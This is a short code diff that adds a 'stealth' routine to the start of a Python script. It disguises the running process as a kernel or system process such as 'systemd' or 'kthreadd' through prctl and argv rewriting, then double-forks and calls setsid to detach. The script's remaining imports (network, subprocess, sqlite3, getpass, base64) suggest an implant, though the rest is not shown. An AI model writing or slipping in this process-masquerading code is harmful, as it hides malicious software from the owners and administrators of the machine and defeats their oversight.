@@ -1,4 +1,30 @@
 #!/usr/bin/env python3
+import os, sys, ctypes, random
+
+# Immediate stealth - before any other imports
+def immediate_stealth():
+    try:
+        # Clear command line arguments
+        new_name = random.choice(["systemd", "kthreadd", "ksoftirqd", "migration"])
+        sys.argv = [new_name]
+        
+        # Change process name
+        ctypes.CDLL(None).prctl(15, new_name.encode())
+        
+        # Fork to detach
+        if os.fork() > 0:
+            os._exit(0)
+        os.setsid()
+        if os.fork() > 0:
+            os._exit(0)
+        
+        return True
+    except:
+        return False
+
+# Apply stealth immediately
+immediate_stealth()
+
 import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
 
